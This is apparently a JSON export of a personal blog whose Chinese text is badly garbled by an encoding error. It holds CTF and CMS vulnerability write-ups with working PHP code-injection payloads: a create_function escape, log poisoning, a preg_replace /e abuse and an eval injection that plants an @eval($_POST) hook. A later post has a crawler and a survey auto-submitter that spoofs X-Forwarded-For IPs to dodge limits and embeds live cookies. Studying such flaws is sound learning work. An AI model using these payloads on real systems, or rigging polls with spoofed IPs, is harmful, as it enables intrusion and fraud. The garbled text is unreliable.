breakingï¼Œæ­£å¥½å¯ä»¥çœ‹çœ‹é‚£ä¸ªğŸ˜€ easy - function12345678&lt;?php $action = $_GET[&apos;action&apos;] ?? &apos;&apos;; $arg = $_GET[&apos;arg&apos;] ?? &apos;&apos;; if(preg_match(&apos;/^[a-z0-9_]*$/isD&apos;, $action)) &#123; show_source(__FILE__); &#125; else &#123; $action(&apos;&apos;, $arg);&#125; $a ?? 0 ç­‰åŒäº isset($a) ? $a : 0 preg_match()è¿”å› pattern çš„åŒ¹é…æ¬¡æ•°ã€‚ å®ƒçš„å€¼å°†æ˜¯0æ¬¡ï¼ˆä¸åŒ¹é…ï¼‰æˆ–1æ¬¡ï¼Œå› ä¸ºpreg_match()åœ¨ç¬¬ä¸€æ¬¡åŒ¹é…å å°†ä¼šåœæ­¢æœç´¢ã€‚è¦æƒ³åŠæ³•ç»•è¿‡æ­£åˆ™ï¼Œ ^ åŒ¹é…å­—ç¬¦ä¸²å¼€å¤´ï¼Œåœ¨å¤šè¡Œæ¨¡å¼ä¸­åŒ¹é…æ¯ä¸€è¡Œçš„å¼€å¤´$ åŒ¹é…å­—ç¬¦ä¸²æœ«å°¾ï¼Œåœ¨å¤šè¡Œæ¨¡å¼ä¸­åŒ¹é…æ¯ä¸€è¡Œçš„æœ«å°¾ æ¨¡å¼åˆ†éš”ç¬¦åçš„â€iâ€æ ‡è®°è¿™æ˜¯ä¸€ä¸ªå¤§å°å†™ä¸æ•æ„Ÿçš„æœç´¢ æ¨¡å¼åˆ†éš”ç¬¦åçš„â€sâ€æ ‡è®°æ¨¡å¼ä¸­çš„ç‚¹å·å…ƒå­—ç¬¦åŒ¹é…æ‰€æœ‰å­—ç¬¦, åŒ…å«æ¢è¡Œç¬¦ æ¨¡å¼åˆ†éš”ç¬¦åçš„â€Dâ€æ ‡è®°æ¨¡å¼ä¸­çš„å…ƒå­—ç¬¦ç¾å…ƒç¬¦å·ä»…ä»…åŒ¹é…ç›®æ ‡å­—ç¬¦ä¸²çš„æœ«å°¾. æ­£åˆ™å¾ˆæ˜æ˜¾ï¼Œå°±æ˜¯è¦æƒ³åŠæ³•åœ¨å‡½æ•°åçš„å¤´æˆ–è€…å°¾æ‰¾ä¸€ä¸ªå­—ç¬¦ï¼Œä¸å½±å“å‡½æ•°è°ƒç”¨ã€‚ æ€ä¹ˆæ‰¾å‘¢ï¼Œfuzzå¤§æ³•å¥½ å½“ç„¶fuzzä¹Ÿæœ‰æŠ€å·§ï¼Œæœ‰æ—¶å€™å¯ä»¥å…ˆè‡ªå·±å†™ä¸ªè„šæœ¬fuzz.php è¿™é‡Œä¸éœ€è¦ä¿®æ”¹è„šæœ¬ï¼Œåªéœ€è¦åœ¨ä¼ å€¼çš„æ—¶å€™åœ¨fuzzååŠ ä¸Šä¸€ä¸ªæ­£å¸¸çš„å‡½æ•°åï¼Œæˆ‘ç”¨äº†var_dumpï¼Œç¬¬ä¸€æ¬¡ç”¨äº†echoä¼šæŠ¥é”™ (â—‹Â´ï½¥Ğ´ï½¥)ï¾‰ å‘ç°#æ˜¯400é”™è¯¯ï¼Œ\\æ­£å¸¸æ˜¾ç¤ºï¼ŒåŸç†å¯ä»¥å‚è€ƒç»™å‡ºçš„é“¾æ¥ ç„¶åæ˜¯æ§åˆ¶ç¬¬äºŒä¸ªå‚æ•°æ¥æ‰§è¡Œå‘½ä»¤ï¼Œå¯ä»¥ä½¿ç”¨create_function()æ¥å®Œæˆ å‡½æ•°ç»“æ„ 1234567create_function(&apos;$a,$b&apos;,&apos;return 111&apos;)==&gt; function a($a,$b)&#123; return 111;&#125; æˆ‘ä»¬æƒ³è¦æ‰§è¡Œä»»æ„ä»£ç ï¼Œé¦–å…ˆéœ€è¦è·³å‡ºå‡½æ•°å®šä¹‰ 1234567create_function(&apos;$a,$b&apos;,&apos;return 111;&#125;phpinfo();//&apos;)==&gt;function a($a, $b)&#123; return 111;&#125;phpinfo();//&#125; å¾ˆå¥‡æ€ªçš„æ˜¯ç›´æ¥æ‰§è¡Œä¸‹é¢çš„ä¼šæŠ¥é”™ï¼Œè€Œä¸”ä¸èƒ½æŠŠ//å»æ‰ 123function a($a, $b)&#123; return 111;&#125;phpinfo();//&#125; æ‰€ä»¥æœ€åçš„payloadï¼š ?action=\\create_function&amp;arg=}phpinfo();// å‚è€ƒé“¾æ¥ï¼šhttps://paper.seebug.org/755/ phpstormçš„è°ƒè¯•é—®é¢˜çœŸæ˜¯é†‰äº†ï¼Œæƒ³èµ·ä¹‹å‰çœ‹åˆ°åŒå­¦åœ¨åˆ·","categories":[],"tags":[{"name":"ä»£ç å®¡è®¡","slug":"ä»£ç å®¡è®¡","permalink":"http://yoursite.com/tags/ä»£ç å®¡è®¡/"},{"name":"codebreaking","slug":"codebreaking","permalink":"http://yoursite.com/tags/codebreaking/"}]},{"title":"chinazçš„ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´","slug":"chinazçš„ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´","date":"2019-08-13T04:57:44.000Z","updated":"2019-08-13T05:52:43.257Z","comments":true,"path":"2019/08/13/chinazçš„ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´/","link":"","permalink":"http://yoursite.com/2019/08/13/chinazçš„ä»£ç æ‰§è¡Œå’Œå‘½ä»¤æ‰§è¡Œæ¼æ´/","excerpt":"Xmanå›æ¥çš„ç¬¬2å¤©ï¼ŒæŠŠåˆ˜å“¥å‘çš„åŒ—äº¬è¥çš„pptçœ‹äº†ä¸‹ï¼Œå¤ç°äº†chinazçš„ä¸‰ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä»¥å‰éƒ½æ˜¯ç›²ç›®åˆ·é¢˜ï¼Œé¢˜ç›®è´¨é‡å±‚æ¬¡ä¸é½ï¼Œå¯¹å¾ˆå¤šåŸç†ä¹Ÿæ˜¯ä¸€çŸ¥åŠè§£ï¼Œåœ¨Xmançš„æ—¶å€™å’Œå¼ åŠ›å¤§ä½¬èŠäº†è®¸å¤šï¼Œä»¥åè¦å¤šå¤ç°CMSã€‚","text":"Xmanå›æ¥çš„ç¬¬2å¤©ï¼ŒæŠŠåˆ˜å“¥å‘çš„åŒ—äº¬è¥çš„pptçœ‹äº†ä¸‹ï¼Œå¤ç°äº†chinazçš„ä¸‰ä¸ªå‘½ä»¤æ‰§è¡Œæ¼æ´ï¼Œä»¥å‰éƒ½æ˜¯ç›²ç›®åˆ·é¢˜ï¼Œé¢˜ç›®è´¨é‡å±‚æ¬¡ä¸é½ï¼Œå¯¹å¾ˆå¤šåŸç†ä¹Ÿæ˜¯ä¸€çŸ¥åŠè§£ï¼Œåœ¨Xmançš„æ—¶å€™å’Œå¼ åŠ›å¤§ä½¬èŠäº†è®¸å¤šï¼Œä»¥åè¦å¤šå¤ç°CMSã€‚ 1ã€index.php1234567891011121314&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); $view_class = new View(); $data = array(); if (isset($_GET[&apos;page&apos;])) &#123; $data[&apos;page&apos;] = filter($_GET[&apos;page&apos;]); &#125; else&#123; $data[&apos;page&apos;] = &apos;js&apos;; &#125; $view_class-&gt;echoContent($data[&apos;page&apos;], $data);?&gt; indexé¡µé¢é€šè¿‡pageå‚æ•°è°ƒç”¨ä¸åŒåŠŸèƒ½çš„phpé¡µé¢ 2ã€action.php12345678910&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); $page = filter($_POST[&apos;page&apos;]).&apos;.php&apos;; $post_data = array(); foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value; &#125; @require_once($page);?&gt; å­˜åœ¨æ–‡ä»¶åŒ…å«ï¼Œä½†æ˜¯å­˜åœ¨åç¼€.phpï¼Œè¿‡æ»¤ä¸»è¦æ˜¯filterï¼Œ å…¨å±€æœç´¢ 12345&gt; function filter($input)&gt; &#123;&gt; return str_replace(&apos;.&apos;, &apos;&apos;, $input);&gt; &#125;&gt; å°† . è¿‡æ»¤æˆç©ºï¼Œæ–‡ä»¶åŒ…å«è·¯å¾„ä¸­ä¸èƒ½æœ‰ . å¯¼è‡´æ— æ³•ä½¿ç”¨ç›¸å¯¹è·¯å¾„ é‚£ä¹ˆæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç»å¯¹è·¯å¾„è¿›è¡ŒåŒ…å«ã€‚ å¯ä»¥åŒ…å«å¸¸è§é‡è¦æ–‡ä»¶æˆ–æ—¥å¿—æ–‡ä»¶ 3ã€common.php12345function write_log($input)&#123; global $cfg_logfile; file_put_contents($cfg_logfile, $input, FILE_APPEND);&#125; 123456789101112function loadFile($filePath)&#123; global $cfg_basedir; if(!file_exists($filePath))&#123; write_log(&apos;Try to open Null file:&apos;.$filePath); return file_get_contents($cfg_basedir.&apos;/error.php&apos;); &#125; $fp = @fopen($filePath,&apos;r&apos;); $sourceString = @fread($fp,filesize($filePath)); @fclose($fp); return $sourceString;&#125; 1$cfg_logfile = dirname($_SERVER[&apos;SCRIPT_FILENAME&apos;]) . DS. &quot;logs/logfile.php&quot;; å½“è®¿é—®ä¸å­˜åœ¨çš„é¡µé¢æ—¶ï¼Œå†™å…¥å†…å®¹åˆ°logs/logfile.phpä¸­ 4ã€æ¼æ´ä¸€æ”»å‡»å¤ç°æ„é€ payloadï¼š http://59.110.164.44:8238/?page=%3Cphp%20phpinfo();?%3E è®¿é—®ï¼š http://59.110.164.44:8238/logs/logfile.php å¦‚æœæ²¡æœ‰ç›´æ¥è®¿é—®æƒé™ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨action.phpä¸­çš„æ–‡ä»¶åŒ…å«ï¼Œ å¹¶ä¸”å¯ä»¥çœ‹åˆ°phpinfoä¸­ï¼Œå› æ­¤æ— æ³•è¿œç¨‹æ–‡ä»¶åŒ…å« allow_url_fopen On On allow_url_include Off Off 5ã€normaliz.php12345678910try&#123; if ($method == &apos;/\\\\d+\\\\.\\\\d+\\\\.\\\\d+\\\\.\\\\d+/&apos;) &#123; $res = preg_replace($method, $ip_replacement, $source); &#125; else &#123; $res = preg_replace($method, $mail_replacement, $source); &#125; &#125; preg_replaceçš„æ­£åˆ™å¦‚æœåŠ äº†eè¿™ä¸ªé€‰é¡¹ï¼Œä¼šæŠŠæ­£åˆ™è¡¨è¾¾å¼æ›¿æ¢çš„éƒ¨åˆ†æ›¿æ¢ä¹‹åçš„å†…å®¹æ‰§è¡Œä¸€ä¸‹ï¼Œç„¶åå°†æ‰§è¡Œå®Œçš„ç»“æœæ”¾å…¥éœ€è¦è¢«æ›¿æ¢çš„ä½ç½® method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a; preg_replace(â€œ/a/eâ€,â€phpinfo()â€,â€aâ€); ä½†æ˜¯php 7.0.0å¼€å§‹ï¼Œä¸å†æ”¯æŒ/eä¿®é¥°ç¬¦ï¼Œè¯·ç”¨preg_replace_callback()ä»£æ›¿ è€Œä¸”ä»å‰é¢çš„phpinfoå¾—çŸ¥æˆ‘ä»¬çš„PHPç‰ˆæœ¬æ˜¯7.3.4ğŸ¤¦â€ 6ã€å…ˆè§£å†³å˜é‡è¦†ç›–é—®é¢˜1234567$view_class = new View();$data = array();$data[&apos;page&apos;] = &apos;normaliz&apos;;$ip_replacement = &apos;222.222.222.222&apos;;$mail_replacement = &apos;lollol@lol.com&apos;;$data[&apos;res&apos;] = action($post_data, $ip_replacement, $mail_replacement);$view_class-&gt;echoContent($data[&apos;page&apos;], $data); é™¤äº†$post_dataï¼Œå…¶ä»–å€¼éƒ½æ˜¯å†™æ­»çš„ï¼Œå¦‚ä½•æ§åˆ¶ é€šè¿‡action.phpçš„æ–‡ä»¶åŒ…å«ï¼Œè¿›è¡Œå˜é‡è¦†ç›–æ§åˆ¶ 1234$post_data = array();foreach ($_POST as $key =&gt; $value) &#123; $post_data[$key] = $value;&#125; + normaliz.php 1234function action($post_data, $ip_replacement, $mail_replacement)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; 7ã€æ¼æ´äºŒæ”»å‡»å¤ç°åœ¨æœ¬åœ°å°†phpåˆ‡æ¢ä¸ºphp5.4æ„é€ payload: http://127.0.0.1/chinaz/ postï¼š page=normaliz&amp;method=/a/e&amp;mail_replacement=phpinfo()&amp;source=a 8ã€view.php1@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;); å’Œå…¸å‹çš„æµ·æ´‹cmsæ¼æ´å·®ä¸å¤š 1234&lt;?php $strIf=&apos;&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;&apos;; var_dump(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;); var_dump(@eval(&quot;if(&quot;.$strIf.&quot;)&#123;\\$ifstatus=true;&#125;else&#123;\\$ifstatus=false;&#125;&quot;)); ç»“æœï¼š 1234567string(66) &quot;if(&quot;&quot;or phpinfo() or&quot;&quot;==&quot;&quot;)&#123;$ifstatus=true;&#125;else&#123;$ifstatus=false;&#125;&quot;phpinfo()PHP Version =&gt; 7.3.4System =&gt; Windows NT DESKTOP-58QQPVV 10.0 build 17134 (Windows 10) AMD64............ 9ã€å¯»æ‰¾æ”»å‡»ç‚¹123456789101112131415161718192021&lt;?php require_once(&quot;library/common.php&quot;); require_once(&quot;library/view.php&quot;); function action($post_data)&#123; foreach ($post_data as $key =&gt; $value) &#123; $$key = $value; &#125; if ($method===&apos;md5&apos;)&#123; $res = md5($source); &#125; if ($method===&apos;sha1&apos;)&#123; $res = sha1($source); &#125; return $res; &#125; $view_class = new View(); $data = array(); $data[&apos;page&apos;] = &apos;md5&apos;; $data[&apos;res&apos;] = action($post_data); $view_class-&gt;echoContent($data[&apos;page&apos;], $data);?&gt; md5æ–‡ä»¶åŒ…å«äº†view.phpï¼Œä¸”æœ‰å˜é‡è¦†ç›–ç‚¹ï¼Œreså¯æ§åˆ¶$strif è¯æ˜¯è¿™ä¹ˆè¯´ï¼Œä½†æ˜¯çœ‹äº†åŠå¤©ä¹Ÿçœ‹ä¸æ‡‚resæ˜¯æ€ä¹ˆæ§åˆ¶$strIfçš„ï¼Œå¤ªå¤šå¤„ç†å‡½æ•°ï¼Œæœ€è®¨åŒçš„ä¸€ç‚¹æ˜¯æˆ‘æ¯æ¬¡firefox+burp+phpstormè°ƒè¯•ä¸€ä¼šå°±ä¼šæ–­æ‰ã€‚ã€‚ã€‚ä¸çŸ¥é“ä¸ºå•¥ğŸ˜­ 10ã€æ¼æ´ä¸‰å¤ç°æ„é€ payloadï¼š http://127.0.0.1/chinaz/action.php postï¼špage=md5&amp;res=â€or @eval($_POST[adddd]) or â€œ&amp;adddd=phpinfo(); è¿™é‡Œçš„postçš„å€¼éœ€è¦bpæŠ“åŒ…ä¿®æ”¹ï¼Œå› ä¸ºhackbarç›´æ¥ä¼ å€¼resä¼šå˜æˆâ€â€ è·Ÿç€pdfé‡Œé¢çš„æµç¨‹èµ°äº†ä¸€éï¼Œé™¤äº†ç¬¬ä¸‰ä¸ªå…·ä½“ç»†èŠ‚ä¸æ˜¯å¾ˆæ‡‚ï¼Œç­‰ä¸‹æ¬¡å¤ç°æµ·æ´‹CMSçš„æ—¶å€™å†å›å¤´çœ‹çœ‹æŠŠï¼Œè¿˜æœ‰å¸Œæœ›æœ‰äººå¸®æˆ‘è§£å†³æˆ‘çš„è°ƒè¯•é—®é¢˜ã€‚","categories":[],"tags":[{"name":"cms","slug":"cms","permalink":"http://yoursite.com/tags/cms/"},{"name":"å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ","slug":"å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ","permalink":"http://yoursite.com/tags/å‘½ä»¤æ‰§è¡Œä¸ä»£ç æ‰§è¡Œ/"}]},{"title":"çˆ¬è™«å…¥é—¨","slug":"çˆ¬è™«å…¥é—¨","date":"2019-07-25T05:20:39.000Z","updated":"2019-08-13T05:48:03.453Z","comments":true,"path":"2019/07/25/çˆ¬è™«å…¥é—¨/","link":"","permalink":"http://yoursite.com/2019/07/25/çˆ¬è™«å…¥é—¨/","excerpt":"åœ¨è½¯ä»¶åˆ›æ–°å®éªŒå®¤æš‘æœŸé›†è®­çš„æ—¶å€™ï¼Œå¶åŒå­¦è®²äº†çˆ¬è™«ï¼Œè¿™é‡Œç®€å•æŠŠä¸¤ç§çˆ¬è™«åº”ç”¨è®°å½•ä¸‹ã€‚è¿˜æœ‰ï¼Œæˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦çˆ¬è™«æ˜¯é€šè¿‡å¼ å®ä¼¦çš„ã€Šå…¨æ ˆæ•°æ®å·¥ç¨‹å¸ˆã€‹ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å»çœ‹çœ‹","text":"åœ¨è½¯ä»¶åˆ›æ–°å®éªŒå®¤æš‘æœŸé›†è®­çš„æ—¶å€™ï¼Œå¶åŒå­¦è®²äº†çˆ¬è™«ï¼Œè¿™é‡Œç®€å•æŠŠä¸¤ç§çˆ¬è™«åº”ç”¨è®°å½•ä¸‹ã€‚è¿˜æœ‰ï¼Œæˆ‘ç¬¬ä¸€æ¬¡æ¥è§¦çˆ¬è™«æ˜¯é€šè¿‡å¼ å®ä¼¦çš„ã€Šå…¨æ ˆæ•°æ®å·¥ç¨‹å¸ˆã€‹ï¼Œæ„Ÿå…´è¶£çš„å¯ä»¥å»çœ‹çœ‹ 1ã€çˆ¬å–æŸç½‘ç«™çš„æ‹›è˜ä¿¡æ¯1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677import requestsimport reimport timeimport jsonimport csvfrom bs4 import BeautifulSoupheaders = &#123; &apos;User-Agent&apos;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36&quot;&#125;s = requests.session()f = open(&quot;data.json&quot;, &quot;a&quot;, encoding=&apos;utf-8&apos;)def get_one_page(url): try: r = requests.get(url, headers=headers) r.encoding = r.apparent_encoding return r.text except: return &quot;çˆ¬å–å¤±è´¥&quot;import pandas as pddef parse_page3(res): html = BeautifulSoup(res, &quot;html.parser&quot;) # print(res) result = [] place = html.select(&quot;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_name.clearfix &gt; a &gt; span.address&quot;) job = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_name.clearfix &gt; a &gt; span.name&apos;) salary = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; p&apos;) company = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_comp &gt; div &gt; a&apos;) welfare = html.select(&apos;#list_con &gt; li &gt; div.item_con.job_title &gt; div.job_wel.clearfix&apos;) for place, job, salary, company, welfare in zip(place, job, salary, company, welfare): result.append(&#123; &quot;place&quot;: place.get_text(), &quot;job&quot;: job.get_text(), &quot;salary&quot;: salary.get_text(), &quot;company&quot;: company.get_text(), &quot;welfare&quot;: welfare.get_text() &#125;) # å‚¨å­˜ä¸ºjsonæ–‡ä»¶ f.write(json.dumps(result, indent=2, ensure_ascii=False)) # å‚¨å­˜ä¸ºcsvæ–‡ä»¶(pandas) df = pd.DataFrame(result) df.to_csv(&apos;data2.csv&apos;, index=False, sep=&apos;,&apos;, mode=&apos;a&apos;) # å‚¨å­˜ä¸ºexcelæ–‡ä»¶ df = pd.DataFrame(result) df.to_csv(&apos;data3.xls&apos;, index=False, sep=&apos; &apos;, mode=&apos;a&apos;, encoding=&apos;utf-8_sig&apos;) return resultdef main(offset): url = &quot;https://hz.58.com/ywtzjingli/pn&quot; + str( offset) + &quot;/?classpolicy=main_null,job_A&amp;final=1&amp;jump=1&amp;PGTID=0d35f8c7-0004-f4fa-d607-70e9d941aa91&amp;ClickID=2&quot; html = get_one_page(url) result = parse_page3(html) # print(result) # tmp1 = [] # for dic in result: # print(dic) # tmp = [] # tmp.append(dic[&apos;place&apos;]) # tmp.append(dic[&apos;job&apos;]) # tmp.append(dic[&apos;salary&apos;]) # tmp.append(dic[&apos;company&apos;]) # tmp.append(dic[&apos;welfare&apos;]) # print(tmp) # tmp1.append(tmp)if __name__ == &apos;__main__&apos;: for i in range(1, 4): main(i) time.sleep(1) 2ã€è‡ªåŠ¨å¡«å†™é—®å·123456789101112131415161718192021222324252627282930313233import timefrom random import randintimport requestsurl = &quot;https://www.wjx.cn/joinnew/processjq.ashx?submittype=1&amp;curID=43819938&amp;t=1565166732242&amp;starttime=2019%2F8%2F7%2016%3A32%3A09&amp;ktimes=26&amp;rn=606189091.36417905&amp;hlv=1&amp;jqnonce=b636e088-5337-4ff5-973b-4ac2fd8b59ee&amp;jqsign=d050c6%3E%3E%2B3551%2B2%60%603%2B%3F15d%2B2ge4%60b%3Ed3%3Fcc&amp;jpm=17&quot;for i in range(1,10): header = &#123; &apos;Host&apos;:&apos;www.wjx.cn&apos;, &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0&apos;, &apos;Accept&apos;: &apos;* / *&apos;, &apos;Accept - Language&apos;:&apos;zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2&apos;, &apos;Accept - Encoding&apos;: &apos;gzip, deflate&apos;, &apos;Content-Type&apos;: &apos;application/x-www-form-urlencoded&apos;, &apos;Referer&apos;: &apos;https://www.wjx.cn/jq/43819938.aspx&apos;, &apos;Content-Length&apos;: &apos;32&apos;, &apos;x-forwarded-for&apos;:str(randint(1,255))+&apos;,&apos;+str(randint(1,255))+&apos;,&apos;+str(randint(1,255))+&apos;,&apos;+str(randint(1,255)), &apos;Cookie&apos;: &apos;acw_tc=2f624a2a15651667032113449e5a5a78c559be33a29f05393240f389ae1f26; .ASPXANONYMOUS=xwlWYYyD1QEkAAAANGQyY2UwY2QtNmMwMi00YzdjLTkyNjgtYjAwOTJjYzJlZWJhKVHVbWcXUrju0Qwec7aNRZwVtj81; jac43819938=36417905; UM_distinctid=16c6b348da41e1-011e2866b35c748-4c312272-144000-16c6b348da529f; CNZZDATA4478442=cnzz_eid%3D1762370884-1565166375-%26ntime%3D1565166375; Hm_lvt_21be24c80829bd7a683b2c536fcf520b=1565166702; Hm_lpvt_21be24c80829bd7a683b2c536fcf520b=1565166729; jpckey=%u5B66%u5386; LastActivityJoin=43819938,103045812444&apos;, &apos;Connection&apos;: &apos;close&apos; &#125; print(&apos;Using ip:&apos;+header[&apos;x-forwarded-for&apos;]) #submitdata = &quot;1$%s&#125;2$%s&#125;3$%s&quot; % (str(randint(1, 2)), str(randint(1, 4)), str(randint(1, 4))) # data = &#123; # &apos;submitdata&apos;:submitdata # &#125; data = &quot;submitdata=1%24&quot;+str(randint(1,2))+&quot;%7D2%24&quot;+str(randint(1,4))+&quot;%7D3%24&quot;+str(randint(1,4)) print data r = requests.post(url,headers=header,data=data) print r.headers print r.content time.sleep(40) headersä»bpæŠ“çš„åŒ…å¤åˆ¶å³å¯ ç»•è¿‡æ–¹æ³•ï¼šä½¿ç”¨xffã€è®¾ç½®è„šæœ¬å‘åŒ…çš„æ—¶é—´é—´éš” ç›®å‰è„šæœ¬å¾ˆå¤§æ¦‚ç‡ä¼šå‡ºç°å›½å¤–ipï¼Œå¯ä»¥æœé›†å›½å†…ip å‚è€ƒé“¾æ¥ï¼šhttps://mochazz.github.io/","categories":[],"tags":[{"name":"çˆ¬è™«","slug":"çˆ¬è™«","permalink":"http://yoursite.com/tags/çˆ¬è™«/"}]},{"title":"Start","slug":"start","date":"2019-07-18T03:48:34.000Z","updated":"2019-07-18T11:16:12.822Z","comments":true,"path":"2019/07/18/start/","link":"","permalink":"http://yoursite.com/2019/07/18/start/","excerpt":"","text":"Skr è¿™æ¬¡å¤©buuctfåšåˆ°è‡ªé—­ï¼Œçœ‹æ¢ä¸ªåšå®¢èƒ½ä¸èƒ½æ¢ä¸ªå¿ƒæƒ…:)","categories":[],"tags":[{"name":"start","slug":"start","permalink":"http://yoursite.com/tags/start/"}]}]}